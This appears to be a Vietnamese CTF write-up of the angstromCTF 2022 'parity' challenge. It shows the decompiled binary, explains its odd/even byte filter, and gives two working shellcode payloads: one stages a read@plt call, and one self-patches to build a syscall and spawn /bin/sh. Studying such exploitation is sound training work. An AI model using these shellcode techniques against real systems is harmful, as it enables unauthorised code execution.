---
title: shellcode-collection
date: 2025-02-11 00:00:00 +0800
categories: [pwn]
tags: [shellcode]
author: "kuvee"
layout: post
---

## parity ()

1 bài shellcode chẵn lẻ (angstromCTF 2022)

file [here](/assets/files/parity-angstrom2022)

- chương trình rất đơn giản , đầu tiên tạo vùng nhớ bằng cách **mmap** , read 2000 bytes vào và gọi nó , đây là 1 bài shellcode điển hình tuy nhiên nó có 1 số điều kiện 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-14h]
  void *buf; // [rsp+10h] [rbp-10h]
  __gid_t rgid; // [rsp+18h] [rbp-8h]
  int i; // [rsp+1Ch] [rbp-4h]

  setbuf(_bss_start, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  printf("> ");
  buf = mmap(0LL, 0x2000uLL, 7, 34, 0, 0LL);
  v4 = read(0, buf, 0x2000uLL);
  for ( i = 0; i < v4; ++i )
  {
    if ( (*((_BYTE *)buf + i) & 1) != i % 2 )
    {
      puts("bad shellcode!");
      return 1;
    }
  }
  ((void (__fastcall *)(_QWORD))buf)(0LL);
  return 0;
}
```
- ở đây nếu i chẵn thì vế phải sẽ là **true** và nếu vế trái là byte chẵn thì là **false** , điều kiện để vượt qua là cả 2 đều là **true** hoặc đều là **false**

```c
  for ( i = 0; i < v4; ++i )
  {
    if ( (*((_BYTE *)buf + i) & 1) != i % 2 )
    {
      puts("bad shellcode!");
      return 1;
    }
  }
```

- nói đơn giản hơn nếu i là lẻ thì bytes shellcode là lẻ và ngược lại , bài này không có seccomp nên ta có thể viết shellcode lấy shell như bình thường 
- tuy nhiên có một vấn đề ở đây , nếu ta viết shellcode để lấy shell thì khi đến đoạn **syscall** , instruction này , ở đây 2 byte liên tiếp đều là byte lẻ nên nó sẽ không thõa điều kiện của ta 
 ![here](/assets/images/sc.png)

vậy ta sẽ quyết định đi theo 1 hướng khác , ta sẽ viết 1 shellcode để thực thi lệnh read() , với read ở đây sẽ là read@plt , trước hết ta cần xem các reg và stack nó thế nào , ta có thể sử dụng được không?

![here](/assets/images/shellcode.png)

- ở đây ta thấy rax , rdi sẽ là NULL , nếu ta muốn call read thì ta phải setup thêm **rdx** thành 1 giá trị nhỏ hơn (size of readread) , địa chỉ **rax@plt** : 0x4010f0 

- ta có thể setup cho **rdx** NULL bằng **cdq** , nếu byte của **rax** là dương thì nó sẽ là 0 , ngoài ra có 1 số instruction chỉ có 3 byte thì ta có thể dùng **nop** và **cdq** để filter vào với **nop** là byte chẵn và **cdq** là byte lẻ , 2 thằng này đều chỉ có 1 byte duy nhất

```cs
sc = asm('''
    xor rax, 0x40-1
    inc rax
    cdq
    shl rax, 7
    shl rax, 1
    cdq
    xor rax, 9
    add rax, 7

    shl rax, 7
    shl rax, 1

    cdq
    xor rax, 0x7f
    add rax, 0x75
    xor rdx, 0x71
    nop
    call rax
         ''')
```

- ngoài ra pháp sư khác chế 1 shellcode có thể dùng được syscall : 

```cs
sc2 = asm('''
        push rdx 
        pop rcx
        push rdx
        pop rdi
        nop
        push rcx
        pop rax
        push rcx
        push 0x1
        nop
        pop rbx
        add BYTE PTR[rcx+0x32], bl
        push rcx
        inc cl
        add BYTE PTR[rcx+0x32], bl
        pop rcx
        add BYTE PTR[rcx+0x2c], bl

        // rdi = &"/bin/sh"
        push rcx
        add al, 0x2d
        push rax
        pop rdi

        // rdx = 0
        xor rdx, rdx
        push rcx

        // rax = 59
        xor rax, rax
        push rcx
        add al, 59

        // rsi = 0
        xor rsi, rsi

// syscall: 0f 05
.byte 0x0f
.byte 0x04

// /bin/sh
.byte 0x2f
.byte 0x62
.byte 0x69
.byte 0x6e
.byte 0x2f
.byte 0x72
.byte 0x67
.byte 0x00
.byte 0xff
          ''')
```